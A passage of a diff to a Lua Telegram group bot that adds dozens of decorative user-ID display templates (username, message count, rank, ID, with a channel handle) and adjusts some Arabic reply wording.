+𖣰𖡻 𖡋𝗦𝗧𝗔• #stast •𓀎
+𖣰𖡻 𖡋𝗠𝗦𝗚• #msgs •𓀎
+𖣰𖡻 𖡋𝗔𝗨𝗧𝗢• #auto •𓀎
+𖣰𖡻 𖡋𝗘𝗗𝗜𝗧• #edit • 𓀎
+┄─━━◉━━─┄
+𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+𖤍 |↶ #id    ꙰🇪🇬.
+𖤍 |↶ #username    ꙰🇪🇬.
+𖤍 |↶ #msgs    ꙰🇪🇬.
+𖤍 |↶ #stast    ꙰🇪🇬.
+𖤍 |↶ 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+ 𝗨𝗦𝗘𝗥 ⟿ #username  « 
+ 𝗠𝗦𝗚𝗦 ⟿  #msgs  « 
+ 𝗦𝗧𝗔 ⟿ #stast  « 
+ 𝗜𝗗  ⟿ #id  « 
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+🇪🇬≪💎≫ #username • メ
+🇪🇬≪💎≫ #stast  •メ
+🇪🇬≪💎≫ #id  • メ
+🇪🇬≪💎≫ #msgs  •メ
+🇪🇬≪💎≫ #game •メ
+🇪🇬𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+⌯  𝚄𝚂𝙴𝚁 𓄹𓄼 #username
+⌯  𝙸𝙳  𓄹𓄼 #id 
+⌯  𝚂𝚃𝙰 𓄹𓄼 #stast 
+⌯  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
+⌯  𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
+𓅓➪ : 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- ايديڪ  ⁞ #id 💘 ٬
+- يوزرڪ القميل ⁞ #username 💘 ٬
+- رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
+- رتبتڪ الحلوه ⁞ #stast  💘٬
+- سحڪاتڪ الفول ⁞ #edit 💘 ٬
+- 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
+𓁷 - 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𖡋 𝐔𝐒𝐄 ⌯ #username 
+𖡋 𝐌𝐒𝐆 ⌯ #msgs 
+𖡋 𝐒𝐓𝐀 ⌯ #stast 
+𖡋 𝐈𝐃 ⌯ #id 
+𖡋 𝐄𝐃𝐈𝐓 ⌯ #edit
+𖡋 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
+𖤂 ~ 𝑚𝑠𝑔 #msgs 𖤐
+𖤂 ~ 𝑠𝑡𝑎 #stast  
+𖤂 ~ 𝑖𝑑 #id 𖤐
+𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
+𖤂 ~ 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
+-›   𝗶𝗗 - @DV_POWER1 🇪🇬 ꙰.
+]],
+[[
+••• ••• ••• ••• ••• ••• ••• 
+࿕ ¦• 𝙐𝙎𝙀𝙍  ⟿ #username ༆
+ ࿕ ¦• 𝙈𝙎𝙂𝙎   ⟿ #msgs ༆
+ ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
+ ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
+••• ••• ••• ••• ••• ••• •••
+ ࿕ ¦• 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
+► 𝗜𝗗 #id 𓃚 ꙰
+► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
+► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
+► 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- UsEr🇪🇬 ꙰ #username
+- StA🇪🇬 ꙰   #msgs
+- MsGs🇪🇬 ꙰ #stast
+- ID🇪🇬 ꙰  #id
+- 𝗶𝗗 🇪🇬 ꙰  @DV_POWER1 🦅
+]],
+[[
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
+🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
+🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 - 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
+- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
+- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
+- 𓏬 𝐈𝐃 : #id 𓂅 .
+- 𓏬 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
+ᯓ 𝟔𝟔𝟔𖡋 #stast  •✟
+ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
+ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
+ᯓ 𝟔𝟔𝟔𖡋 #game •✟
+ᯓ 𝟔𝟔𝟔𖡋 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+🦅•𝐮𝐬𝐞𝐫 : #username 𖣬  
+🦅•𝐦𝐬𝐠  : #msgs 𖣬 
+🦅•𝐬𝐭𝐚 : #stast 𖣬 
+🦅•𝐢𝐝  : #id 𖣬
+🦅•𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- ᴜѕʀ: #username ঌ.
+- ᴍѕɢ: #msgs  ঌ.
+- ѕᴛᴀ: #stast  ঌ.
+- ɪᴅ: #id ঌ.
+- 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
+- 𝑚𝑠𝑔𝑠 ⟿ #msgs
+- 𝑖𝑑 ⟿ #id
+- 𝑒𝑑𝑖𝑡 ⟿ #edit
+- 𝑔𝑎𝑚𝑒 ⟿ #game
+- 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+🌯 ¦✙• 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
+🌯 ¦✙• 𝒎𝒔𝒈𝒔 ➢ ⁞  #msgs  📝
+🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
+🌯 ¦✙• 𝒊𝒅 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
+🌯 ¦ 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 ꙰  - 𝚞 𝚜𝚎 𝚛 ➟ #username  ❃.
+🇪🇬 ꙰  - 𝚖 𝚜𝚐 𝚜 ➟ #msgs ❃.
+🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
+🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 ꙰  - 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+⌔➺: Msgs : #msgs - 🔹.
+⌔➺: ID : #id - 🔹.
+⌔➺: Stast : #stast -🔹.
+⌔➺: UserName : #username -🔹.
+⌔➺: 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪🇬.
+¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
+¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
+¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
+¦• 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
+➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
+➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
+➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
+➞: 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
+➼ : 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+• ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
+• ❉ 𝑺𝑻𝑨 : #stast .
+• ❉ 𝑰𝑫 : #id  ‌‌‏.
+• ❉  𝑴𝑺𝑮 : #msgs 𓆊.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
+• ❉ 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+⌯ |USERNAME #username 𓃚
+⌯ | YOUR -ID - #id 𓃚
+⌯ | STAS-#stast 𓃚
+ ⌯| MSAG - #msgs 𓃚
+ ⌯| 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𝟔𝟔𝟔 𖡋 #username • 𖣰💞
+𝟔𝟔𝟔 𖡋  #stast •𖣰💞
+𝟔𝟔𝟔 𖡋 #id • 𖣰💞
+𝟔𝟔𝟔 𖡋 #game • 𖣰💞
+𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
+𝟔𝟔𝟔 𖡋 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+⌔➺: Msgs : #msgs - 🔹.
+⌔➺: ID : #id - 🔹.
+⌔➺: Stast : #stast -🔹.
+⌔➺: UserName : #username -🔹.
+⌔➺: 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+🦅 - 𝓾𝓼𝓮𝓻 ➪ #username 🦅.
+🦅 - 𝓼𝓽𝓪𝓼𝓽  ➪ #stast 🦅.
+🦅 - 𝓲𝓭 ➪ #id ⸙🦅.
+🦅 - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙🦅.
+🦅 - 𝓶𝓼𝓰𝓼 ➪ #msgs 🦅.
+🦅 - 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
+◣: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➥♡.
+◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
+◣: 𝒊𝒅 𓂅 #id 𓍯➥♡.
+◣: 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
+ - 𝄬 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+↣• USE ➤ #username  ↝🍬.
+↣• MSG ➤  #msgs  ↝🍬.
+↣• STA ➤  #stast  ↝🍬.
+↣• iD ➤ #id  ↝🍬.
+↣• 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+➫✿: S #stast 𓍯➟♡.
+➫✿: U𓂅 #username 𓍯➟♡.
+➫✿: M𓂅 #msgs 𓍯➟♡.
+➫✿:  I  #id ➟♡.
+➫✿: 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
+✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
+✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
+✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
+✶- 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+• 🖤 | 𝑼𝑬𝑺 :  #username
+
+• 🖤 | 𝑺𝑻𝑨 : #stast
+
+• 🖤 | 𝑰𝑫 :  #id
+
+• 🖤 | 𝑴𝑺𝑮 : #msgs
+
+• 🖤 | 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+• USE 𖦹 #username 
+• MSG 𖥳 #msgs  
+• STA 𖦹 #stast 
+• iD 𖥳 #id
+• 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
+- 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+⚕𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : #username
+⚕𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 : #msgs
+⚕𝙎𝙏𝘼𝙏𝙎 : #stast
+⚕𝙄𝘿 : #id
+⚕𝙅𝙀𝙒𝙀𝙇𝙎 : #game
+⚕𝘿𝙀𝙑 : #ridha
+⚕𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+• 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
+• 🦄 | 𝑺𝑻𝑨 : #stast ☥
+• 🦄 | 𝑰𝑫 : #id ‌‌‏♕
+• 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
+• 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
+• 🦄 | 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+• △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
+• ▽ | 𝑺𝑻𝑨 : #stast ☥
+• ⊠ | 𝑰𝑫 : #id ‌‌‏♕
+• ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
+• ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
+• ❏ | 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+︙iD ➺ #id 💘
+︙UsEr ➺ #username 💕
+︙MsG ➺ #msgs 🧸 
+︙StAtE ➺ #stast 🎀
+︙EdIT ➺ #edit  💒
+︙𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
+• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
+• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
+• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
+• 🖤 | 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+𓄼 ᴜѕᴇ : #username ♕
+𓄼 ѕᴛᴀ : #stast ☥
+𓄼 ɪᴅ : #id ‌‌‏⚚
+𓄼 ᴍѕɢ : #msgs 𓆊
+𓄼 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+‎⿻┊Yor iD 𖠄 #id ٫
+‌‎⿻┊UsEr 𖠄 #username ٫
+‌‎⿻┊MsGs 𖠄 #msgs ٫
+‌‎⿻┊StAtS 𖠄 #stast ٫
+‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
+‌‎⿻┊‌‎𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+• ﮼ايديك  #id 🌻 ٬
+• ﮼يوزرك ➺ #username 🌻 ٬
+• ﮼مسجاتك ➺ #msgs 🌻 ٬
+•  ﮼رتبتك➺ #stast 🌻 ٬
+• ﮼تعديلك ➺ #edit 🌻 ٬
+•  تعين ➺ @DV_POWER1 🦅
+]],
+[[
+┄─━━◉━━─┄
+𖣤 ᴜѕᴇʀɴᴀᴍᴇ 𓄹𓄼 #id 🇪🇬
+𖦼 ʏᴏᴜʀ ɪᴅ 𓄹𓄼 #username  💛
+𖥪 ᴍѕɢѕ 𓄹𓄼 #msgs ✉️
+𖥧 ѕᴛᴀᴛѕ 𓄹𓄼 #stast 👩🏿‍🚒 
+𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
+✰ ᴄʜ ᴇʟɪɴ ➣ #edit
+┄─━━◉━━─┄
+✰ 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
+⌾ | 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
+♡ : 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+•ᑌᔕᗴᖇ- #username 
+•ᔕTᗩ- #stast 
+•ᗰᔕ- #msgs 
+•Iᗪ- #id
+•𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
+• 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
+𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
+𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
+𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
+𝗖𝗛☤🇪🇬 - @DV_POWER1 🦅
+]],
+[[
+⭐️𝖘𝖙𝖆 : #stast ـ🍭
+⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
+⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
+⭐️𝖎𝖉 : #id ـ 🍭
+⭐️𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+• 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
+• 🇪🇬 - 𝙸𝙳 « #id  🍭
+• 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
+• 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
+• 🇪🇬 - 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
+• 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
+🇪🇬 - 𝄬 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
+➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
+➜𝗦𝗧𝗔𝗧𝗦 : #stast
+➜𝗜𝗗 : #id
+➜𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
+- 🇪🇬 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+⌔︙Msgs : #msgs.
+⌔︙ID : #id.
+⌔︙Stast : #stast.
+⌔︙UserName : #username.
+⌔︙𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𝒔𝒕𝒂𓂅 #stast 𓍯
+𝒖𝒔𝒆𝒓𓂅 #username 𓍯
+𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
+𝒊𝒅 𓂅 #id 𓍯
+𓂅 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
+𓄼🇪🇬 𝑺𝒕𝒂𝒔𝒕 : #stast    ☥
+𓄼🇪🇬 𝒊𝒅 : #id ‌‌‏⚚
+𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
+𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
+𓄼🇪🇬 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+Usᴇʀ Nᴀᴍᴇ ~ #username 
+Yᴏᴜʀ ɪᴅ ~ #id 
+Sᴛᴀsᴛ ~ #stast 
+Msᴀɢ ~ #msgs
+𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+➥• USE 𖦹 #username - 🇪🇬.
+➥• MSG 𖥳 #msgs  - 🇪🇬.
+➥• STA 𖦹 #stast - 🇪🇬.
+➥• iD 𖥳 #id - 🇪🇬.
+➥• 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
+🇪🇬 - 𝄬 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
+.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
+.𖣂 𝙡𝘿 , #id  🖤 ↴
+.𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
+.𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
+.𖣂 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
+金 - 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
+- 🇪🇬 𝗖𝗛 - @DV_POWER1 🦅
+]],
+[[
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
+ᯓ 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
+👳🏼‍♂ - 𝄬 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
+➭- 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+ #id "‎ ﮼ايدي
+#username " ‎ ﮼يوزر
+#stast "‎ ﮼موقعك
+#msgs ‎" ﮼رسائلك
+]],
+[[
+𓄼 ᴜѕᴇ : #username ♕
+𓄼 ѕᴛᴀ : #stast  ☥
+𓄼 ɪᴅ : #id ‌‌‏⚚
+𓄼 ᴍѕɢ : #msgs 𓆊 
+𓐀 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𓀃.
+𓄼 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
+𝐓𝐓• 𝗶𝗗 - @DV_POWER1 🦅
+]],
+[[
+𝟓 𝟔 𖡻 #username  ࿇🦄
+𝟓 𝟔 𖡻 #msgs  ࿇🦄
+𝟓 𝟔 𖡻 #auto  ࿇🦄
+𝟓 𝟔 𖡻 #stast  ࿇🦄
+𝟓 𝟔 𖡻 #id  ࿇🦄
+𝟓 𝟔 𖡻 𝗶𝗗 - @DV_POWER1 🦅
 ]]}
 local Text_Rand = List[math.random(#List)]
 faederdx1:set("FAEDER:faeder:id:text:"..bot_id..msg.chat_id_,Text_Rand)
@@ -7143,7 +8273,7 @@ faederdx(msg.chat_id_, msg.id_, 1,[[*
 ❅∫ ارسل امر { المحيبس } لبدء لعبه 
 ❅∫ ارسل امر { امثله } لبدء لعبه 
 ❅∫ ارسل امر { المختلف } لبدء لعبه 
-❅∫ ارسل امر { انجليزي } لبدء لعبه 
+❅∫ ارسل امر { انكليزي } لبدء لعبه 
 ❅∫ ارسل امر { رياضيات } لبدء لعبه 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ قناة السورس *[@DV_POWER1] 
@@ -7184,7 +8314,7 @@ if text == "الدعم" or text == "المطور" and faeder11(msg) then
 local link = faederdx1:get(FAEDER.."bot:supports:link")
 if link then
 if link:match("https://") then
-faederdx(msg.chat_id_, msg.id_, 1, "❅∫ تم ارسال بياناتك للمطور \n❅∫ يمكنك طلب المساعدة من كروب الدعم \n❅∫ رابط كروب دعم البوت \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n " .. link, 1, "html")
+faederdx(msg.chat_id_, msg.id_, 1, "❅∫ تم ارسال بياناتك للمطور \n❅∫ يمكنك طلب المساعدة من جروب الدعم \n❅∫ رابط جروب دعم البوت \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n " .. link, 1, "html")
 else
 faederdx(msg.chat_id_, msg.id_, 1, "❅∫ تم ارسال بياناتك للمطور \n❅∫ يمكنك طلب المساعدة من بوت التواصل \n❅∫ معرف بوت تواصل المطور \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n @" .. link, 1, "html")
 end end end
@@ -7364,9 +8494,9 @@ end
 if w == 0 then
 faederddx1 = ''
 else
-faederddx1 = '\n*❅∫ تم مسح ⌯» { '..w..' } كروب بسبب تنزيل البوت عضو*'
+faederddx1 = '\n*❅∫ تم مسح ⌯» { '..w..' } جروب بسبب تنزيل البوت عضو*'
